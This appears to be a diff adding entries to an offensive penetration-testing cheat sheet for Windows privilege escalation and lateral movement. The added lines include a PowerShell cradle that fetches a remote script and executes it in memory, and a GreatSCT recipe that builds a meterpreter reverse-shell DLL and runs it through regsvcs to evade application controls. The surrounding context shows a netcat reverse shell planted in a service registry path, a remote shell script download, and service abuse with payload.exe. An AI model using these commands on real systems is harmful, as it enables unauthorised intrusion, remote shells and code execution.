@@ -44,12 +44,14 @@ wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB
 ```
 get-acl HKLM:\System\CurrentControlSet\services\*
 get-acl HKLM:\System\CurrentControlSet\services\* | Format-List *| findstr /i "<username> Users Path"
+Get-Service <servicename> | fl *
 ```
 
 ### [Get Service Name and Path (May Require Escalated Privileges)]
 ```
 Get-Service
 Get-WmiObject win32_service | ?{$_.Name -like '*<ServiceName>*'} | select Name, DisplayName, State, PathName
+"<servicename>" | Get-ServiceAcl | select -ExpandProperty Access
 ```
 
 ### [Check scheduled Tasks]
@@ -212,6 +214,11 @@ ength);​ $stream​ .Flush()};​ $client​ .Close()
 START /B "" powershell "(new-object System.Net.WebClient).Downloadfile('http://example:port/shell.ps1', 'shell.ps1')"
 ```
 
+### [Execute powershell script in memory]
+```
+$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://<LocalIP>/file.ps1',$false);$h.send();iex $h.responseText
+```
+
 ### [Modify Registries using powershell]
 ```
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlset\services\wuauserv" -Name ImagePath -Value "C:\path\to\nc.exe IP PORT -e cmd"
@@ -265,6 +272,7 @@ sc failure Fax command= "\"c:\Windows\system32\payload.exe\""
 netstat -tulpn | grep LISTEN
 ssh -L 8000:127.0.0.1:8000 username@IP
 ssh -L 8000:127.0.0.1:8000 -i id_rsa username@IP
+ssh -L 8443:127.0.0.1:8443 <USER>@<RemoteIP>
 ```
 
 ### [Escaping Vi, Vim and Nano]
@@ -712,4 +720,18 @@ python psexec.py <username>:'<password>'@<IP>
 $pass = convertto-securestring '<RemotePASSWORD>' -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential('<RemoteUsername>', $pass)
 New-PSDrive -Name drivename -PSProvider FileSystem -Credential $cred -Root \\<RemoteIP>\<RemoteShare>
+```
+
+### [Creating a malicious DLL using GreatSCT]
+```
+cd ~/
+git clone https://github.com/GreatSCT/GreatSCT
+cd GreatSCT
+sudo ./GreatSCT.py --ip <IP> --port <PORT> -t bypass -p regsvcs/meterpreter/rev_tcp.py -o revshell
+
+OutDir
+/usr/share/greatsct-output/compiled/revshell.dll
+
+Execution of malicious DLL
+cmd /c "echo C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe C:\Temp\revshell.dll
 ```
